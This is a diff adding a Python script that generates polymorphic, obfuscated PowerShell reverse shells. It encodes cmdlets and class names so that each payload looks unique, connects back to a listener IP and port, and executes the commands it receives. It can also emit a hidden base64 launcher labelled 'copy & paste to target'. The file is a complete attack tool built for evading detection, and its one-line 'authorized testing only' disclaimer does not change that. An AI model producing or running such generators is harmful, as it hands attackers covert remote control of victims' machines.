@@ -1,0 +1,321 @@
+#!/usr/bin/env python3
+"""
+Polymorphic PowerShell Reverse Shell Generator
+Mimics the obfuscation engine from powershellforhackers.com/tools/revshell
+
+Obfuscation techniques used (all randomized per generation):
+  1. Random variable names
+  2. Shuffled-alphabet character-index lookups for cmdlets
+  3. Random char arithmetic  ([char](m*v/m) or [char](m+v-m))
+  4. ASCII int-array encoding for strings
+  5. Random buffer-size expression styles
+  6. Random ForEach-Object / %{} pipeline padding
+
+Usage:
+  python3 revshell_gen.py <LHOST> <LPORT>
+  python3 revshell_gen.py 192.168.45.155 4444
+
+  Optional flags:
+    --no-color      Disable colored output
+    --out FILE      Save the payload to a file
+    --b64           Also print a base64-encoded launcher one-liner
+"""
+
+import random
+import string
+import sys
+import argparse
+import base64
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Core obfuscation primitives
+# ──────────────────────────────────────────────────────────────────────────────
+
+def rand_var(min_len: int = 4, max_len: int = 20) -> str:
+    """Random PowerShell-safe variable name (letters + digits, starts with letter)."""
+    pool = string.ascii_letters + string.digits
+    first = random.choice(string.ascii_letters)
+    rest = ''.join(random.choices(pool, k=random.randint(min_len - 1, max_len - 1)))
+    return first + rest
+
+
+def shuffled_lookup(target: str) -> str:
+    """
+    Encode a cmdlet/string as a shuffled-alphabet character-index lookup.
+
+    e.g. "New-Object" -> ("Xq3...")[11,4,22,...] -join ''
+    Each call produces a different shuffled string with different indices.
+    """
+    needed = list(dict.fromkeys(target))          # unique chars, order preserved
+    filler_pool = [c for c in
+                   string.ascii_letters + string.digits + '-_'
+                   if c not in needed]
+    random.shuffle(filler_pool)
+    pad = filler_pool[:random.randint(30, 55)]
+    alphabet = needed + pad
+    random.shuffle(alphabet)
+    alpha_str = ''.join(alphabet)
+
+    indices = []
+    for ch in target:
+        # Pick a random occurrence of this char in the alphabet
+        positions = [i for i, c in enumerate(alpha_str) if c == ch]
+        indices.append(random.choice(positions))
+
+    idx_str = ','.join(map(str, indices))
+    return f'("{alpha_str}")[{idx_str}] -join \'\''
+
+
+def char_arithmetic(s: str) -> str:
+    """
+    Encode a string as PowerShell [char] arithmetic expressions.
+
+    Uses two styles randomly:
+      [char](m * v / m)   -- multiplication that cancels
+      [char](m + v - m)   -- addition that cancels
+    Both always evaluate to the original char value.
+    """
+    parts = []
+    for ch in s:
+        v = ord(ch)
+        style = random.choice(['mul', 'add'])
+        if style == 'mul' and v != 0:
+            m = random.randint(2, 127)
+            parts.append(f'[char]({m}*{v}/{m})')
+        else:
+            m = random.randint(0, 100)
+            parts.append(f'[char]({m}+{v}-{m})')
+    return '+'.join(parts)
+
+
+def int_array_encode(s: str) -> str:
+    """
+    Encode a string as a PowerShell ASCII int-array pipeline.
+
+    e.g. "Flush()" -> ([string]::join('', (70,108,...)|%{[char][int]$_})|%{$_})
+    """
+    ints = ','.join(str(ord(c)) for c in s)
+    # Randomly vary the pipeline padding style
+    if random.choice([True, False]):
+        inner = (f'([string]::join(\'\', ( ({ints}) '
+                 f'|ForEach-Object{{$_}}|%{{ ( [char][int] $_)}}))'
+                 f'|ForEach-Object{{$_}}| % {{$_}})')
+    else:
+        inner = (f'([string]::join(\'\', ( ({ints}) '
+                 f'|%{{ ( [char][int] $_)}}))'
+                 f'| % {{$_}})')
+    return inner
+
+
+def rand_bufsize() -> str:
+    """Random expression that evaluates to 65535."""
+    styles = [
+        '(65535)',
+        '(0-0+65535)',
+        '(65535+0)',
+        '(65536-1)',
+        '(0x0000+65535)',
+    ]
+    return random.choice(styles)
+
+
+def rand_foreach() -> str:
+    """Random short ForEach pipeline suffix."""
+    opts = [
+        '|ForEach-Object{$_}',
+        '|%{$_}',
+        '|ForEach-Object{$_}|%{$_}',
+    ]
+    return random.choice(opts)
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# Payload generator
+# ──────────────────────────────────────────────────────────────────────────────
+
+def generate(ip: str, port: str) -> str:
+    """
+    Build a fully obfuscated PowerShell reverse shell payload.
+    Every call produces a unique-looking but functionally identical script.
+    """
+
+    # ── Variable names ──────────────────────────────────────────────────────
+    v_client   = rand_var()   # TcpClient object
+    v_stream   = rand_var()   # NetworkStream
+    v_buf      = rand_var()   # byte[] receive buffer
+    v_nread    = rand_var()   # bytes read count
+    v_text     = rand_var()   # decoded command string
+    v_result   = rand_var()   # command output string
+    v_prompt   = rand_var()   # full PS prompt string
+    v_outbytes = rand_var()   # bytes to send back
+
+    # ── Cmdlet lookups (new shuffled alphabet per call) ─────────────────────
+    new_obj_a   = shuffled_lookup('New-Object')
+    new_obj_b   = shuffled_lookup('New-Object')
+    invoke_expr = shuffled_lookup('Invoke-Expression')
+    out_str     = shuffled_lookup('Out-String')
+    get_loc     = shuffled_lookup('Get-Location')
+    # For flush / close we sometimes use int-array, sometimes shuffled lookup
+    invoke_low  = (shuffled_lookup('invoke-expression')
+                   if random.choice([True, False])
+                   else int_array_encode('invoke-expression'))
+
+    # ── Class name encoding ─────────────────────────────────────────────────
+    tcp_class   = char_arithmetic('System.Net.Sockets.TcpClient')
+
+    # ASCIIEncoding: pick char-arithmetic OR int-array randomly
+    if random.choice([True, False]):
+        ascii_class = f'$({char_arithmetic("System.Text.ASCIIEncoding")})'
+    else:
+        ascii_class = int_array_encode('System.Text.ASCIIEncoding')
+
+    # ── Flush / Close expressions ───────────────────────────────────────────
+    flush_expr = (f'${v_stream}.Flush()'
+                  if random.choice([True, False])
+                  else f'({int_array_encode(f"${v_stream}.Flush()")})')
+
+    close_expr = int_array_encode(f'${v_client}.Close()')
+
+    # ── Buffer size expression ──────────────────────────────────────────────
+    buf_expr = rand_bufsize()
+
+    # ── Pipeline padding helpers ────────────────────────────────────────────
+    fe1 = rand_foreach()
+    fe2 = rand_foreach()
+    fe3 = rand_foreach()
+
+    # ── Flush line style ───────────────────────────────────────────────────
+    # Style A: direct triple-paren call
+    # Style B: wrapped invoke-expression
+    if random.choice([True, False]):
+        flush_line = f'    (({flush_expr}))'
+    else:
+        flush_line = (f'    $((& ({invoke_low})'
+                      f'({int_array_encode(f"${v_stream}.Flush()")}) | % {{$_}}))')
+
+    # ── Assemble script ────────────────────────────────────────────────────
+    script = (
+        f'${v_client} = & ({new_obj_a}) '
+        f'$({tcp_class})("{ip}", "{port}");\n'
+
+        f'${v_stream} = (${v_client}.GetStream());'
+        f'[byte[]]${v_buf} = 0..$({buf_expr}){fe1}|%{{0}};\n'
+
+        f'while((${v_nread} = ${v_stream}.Read(${v_buf}, 0, ${v_buf}.Length)) -ne 0){{\n'
+
+        f'    ${v_text} = (& ({new_obj_b}) -TypeName '
+        f'{ascii_class}).GetString(${v_buf},0, ${v_nread});\n'
+
+        f'    ${v_result} = (& ({invoke_expr}) ${v_text} 2>&1 '
+        f'{fe2}| & ({out_str}) );\n'
+
+        f'    ${v_prompt} = ${v_result} + \'PS \' + '
+        f'(& ({get_loc})).Path + \'> \';\n'
+
+        f'    ${v_outbytes} = ([text.encoding]::ASCII).GetBytes(${v_prompt});\n'
+
+        f'    ${v_stream}.Write(${v_outbytes},0,${v_outbytes}.Length);\n'
+
+        f'{flush_line}\n'
+
+        f'}};\n'
+
+        f'$((& ({invoke_low})'
+        f'({close_expr}) | % {{$_}}));'
+    )
+
+    return script
+
+
+def to_b64_launcher(payload: str) -> str:
+    """Wrap payload in a base64-encoded one-liner for easy copy-paste."""
+    encoded = base64.b64encode(payload.encode('utf-16-le')).decode()
+    return f'powershell -NoP -NonI -W Hidden -Enc {encoded}'
+
+
+# ──────────────────────────────────────────────────────────────────────────────
+# CLI
+# ──────────────────────────────────────────────────────────────────────────────
+
+CYAN   = '\033[96m'
+GREEN  = '\033[92m'
+YELLOW = '\033[93m'
+RED    = '\033[91m'
+BOLD   = '\033[1m'
+RESET  = '\033[0m'
+
+
+def banner(use_color: bool) -> str:
+    c = CYAN if use_color else ''
+    b = BOLD if use_color else ''
+    r = RESET if use_color else ''
+    return (
+        f'\n{b}{c}'
+        '╔══════════════════════════════════════════════════════╗\n'
+        '║   Polymorphic PowerShell Reverse Shell Generator     ║\n'
+        '║   Replicates: powershellforhackers.com/tools/revshell║\n'
+        '╚══════════════════════════════════════════════════════╝'
+        f'{r}\n'
+    )
+
+
+def main():
+    parser = argparse.ArgumentParser(
+        description='Generate a polymorphic obfuscated PowerShell reverse shell.',
+        formatter_class=argparse.RawTextHelpFormatter,
+        epilog=(
+            'Examples:\n'
+            '  python3 revshell_gen.py --ip 192.168.45.155 --port 4444\n'
+            '  python3 revshell_gen.py --ip 10.10.10.1 --port 9001 --b64\n'
+            '  python3 revshell_gen.py --ip 10.10.10.1 --port 443 --out shell.ps1\n'
+        )
+    )
+    parser.add_argument('--ip',   required=True, metavar='LHOST',
+                        help='Your listener IP address  (e.g. 192.168.45.155)')
+    parser.add_argument('--port', required=True, metavar='LPORT',
+                        help='Your listener port        (e.g. 4444)')
+    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
+    parser.add_argument('--out', metavar='FILE', help='Save payload to file')
+    parser.add_argument('--b64', action='store_true',
+                        help='Also print base64-encoded one-liner launcher')
+    args = parser.parse_args()
+
+    color = not args.no_color
+
+    def c(text, code):
+        return f'{code}{text}{RESET}' if color else text
+
+    print(banner(color))
+    print(c(f'  [*] LHOST : {args.ip}', CYAN))
+    print(c(f'  [*] LPORT : {args.port}', CYAN))
+    print(c(  '  [*] Generating unique obfuscated payload...\n', CYAN))
+
+    payload = generate(args.ip, args.port)
+
+    print(c('━' * 60, YELLOW))
+    print(c('  PAYLOAD', BOLD))
+    print(c('━' * 60, YELLOW))
+    print(payload)
+    print(c('━' * 60, YELLOW))
+
+    if args.b64:
+        launcher = to_b64_launcher(payload)
+        print()
+        print(c('━' * 60, YELLOW))
+        print(c('  BASE64 LAUNCHER (copy & paste to target)', BOLD))
+        print(c('━' * 60, YELLOW))
+        print(launcher)
+        print(c('━' * 60, YELLOW))
+
+    if args.out:
+        with open(args.out, 'w') as f:
+            f.write(payload + '\n')
+            if args.b64:
+                f.write('\n# Base64 launcher:\n# ' + to_b64_launcher(payload) + '\n')
+        print(c(f'\n  [+] Payload saved to: {args.out}', GREEN))
+
+    print(c('\n  [!] For authorized penetration testing only.\n', RED))
+
+
+if __name__ == '__main__':
+    main()
